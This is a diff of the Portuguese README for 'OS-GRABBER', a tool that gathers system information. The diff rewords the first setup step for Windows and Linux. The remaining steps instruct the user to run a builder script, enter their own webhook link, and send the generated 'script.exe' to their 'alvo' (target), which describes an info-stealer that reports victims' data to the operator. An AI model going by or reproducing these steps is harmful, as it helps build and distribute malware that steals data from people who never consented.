@@ -17,14 +17,14 @@ O OS-GRABBER é uma ferramenta Python que coleta informações do sistema operac
 
 ## Configuração (Windows)
 
-1. Clone o repositório do OS-GRABBER em seu sistema.
+1. Instale o grabber em seu windows.
 2. Execute o GRABBER.bat.
 3. Coloque o link do seu webhook.
 4. Espere ele terminar de criar o "script.exe" e envie para o seu alvo.
 
 ## Configuração (Linux)
 
-1. Clone o repositório do OS-GRABBER em seu sistema.
+1. Baixe o grabber em seu linux.
 2. Execute o GRABBER.sh.
 3. Coloque o link do seu webhook.
 4. Espere ele terminar de criar o "script.exe" e envie para o seu alvo.
